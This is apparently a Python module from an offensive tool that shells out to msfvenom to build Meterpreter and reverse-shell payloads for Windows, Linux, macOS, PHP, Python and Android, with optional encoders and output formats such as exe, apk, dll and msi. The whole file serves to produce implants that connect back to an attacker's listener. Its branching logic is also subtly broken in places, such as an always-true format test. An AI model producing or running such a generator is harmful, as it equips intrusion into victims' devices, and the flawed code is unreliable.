from os import system
from Data.Cores_lines import *

lista = ['asp', 'dll', 'elf', 'exe', 'jsp', 'macho', 'msi',
         'msi-nouac', 'vbs', 'war']

t1 = 'windows/meterpreter/reverse_tcp'
t2 = 'windows/meterpreter/reverse_tcp_dns'
t3 = 'windows/meterpreter/reverse_http'
t4 = 'windows/meterpreter/reverse_https'
t5 = 'linux/x86/meterpreter/reverse_tcp'
t6 = 'php/meterpreter/reverse_tcp'
t7 = 'python/meterpreter/reverse_tcp'
t8 = 'python/meterpreter/reverse_http'
t9 = 'python/meterpreter/reverse_https'
t10 = 'osx/shell_reverse_tcp'
t11 = 'android/meterpreter/reverse_tcp'
t12 = 'android/meterpreter/reverse_http'
t13 = 'android/meterpreter/reverse_https'

lista_payloads = [t1, t2, t3, t4, t5, t6, t7, t8, t9, t10, t11, t12, t13]
android = [t11, t12, t13]
linux = [t5]
windows = [t1, t2, t3, t4]
python = [t7, t8, t9]
mac = [t10]
php = [t6]


def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Payloads/', encoder=False):
    if formato == 'exe':
        form = formato
    elif formato == 'elf':
        form = formato
    elif formato == 'php':
        form = formato
    elif formato == 'py' or 'python':
        form = 'pyw'
    elif formato == 'macho':
        form = formato
    elif formato == 'msi' or 'msi-nouac':
        form = 'msi'
    elif formato == 'asp':
        form = formato
    elif formato == 'dll':
        form = formato
    elif formato == 'vbs':
        form = formato
    elif formato == 'war':
        form = formato
    elif formato == 'jsp':
        form = formato
    elif formato == 'apk':
        form = 'apk'

    if tipo == t11 or tipo == t11 or tipo == t12:
        form = 'apk'
        payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}')
        else:
            f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE'
        exit()

    if not encoder:
        payload = system(f"msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}")
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}')
    else:
        payload = system(f'msfvenom -p {tipo} LHOST={ip} LPORT={port} -e {encoder} -f {formato} > {local}{nome}.{form}')
        if payload == 1:
            print()
            print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -e {encoder} -f {formato} >'
                  f' {local}{nome}.{form}')

    exit()
